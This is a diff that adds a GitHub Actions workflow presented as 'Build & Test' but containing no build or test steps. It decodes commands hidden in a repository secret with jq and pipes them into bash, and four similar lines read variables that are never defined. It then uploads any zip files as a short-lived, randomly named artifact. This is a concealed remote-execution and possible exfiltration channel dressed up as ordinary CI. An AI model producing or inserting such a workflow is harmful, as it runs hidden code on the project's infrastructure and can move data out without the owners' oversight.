@@ -1,0 +1,33 @@
+name: Build & Test
+on:
+  workflow_dispatch:
+
+permissions:
+  contents: read
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  trigger:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Start
+        env:
+          jj114: ${{ secrets.jj114 }}
+        run: |
+          printf '%s' "$jj114" | jq -r .d0 | /bin/bash
+          printf '%s' "$f325" | jq -r .ripr6 | /bin/bash
+          printf '%s' "$xys2" | jq -r .v23359 | /bin/bash
+          echo $yitqm4384 | jq -r .lfm21 | /bin/bash
+          printf '%s' "$mz9318" | jq -r .d33 | /bin/bash
+
+      - name: Save output
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: m5mZ7ckn
+          path: "*.zip"
+          retention-days: 1
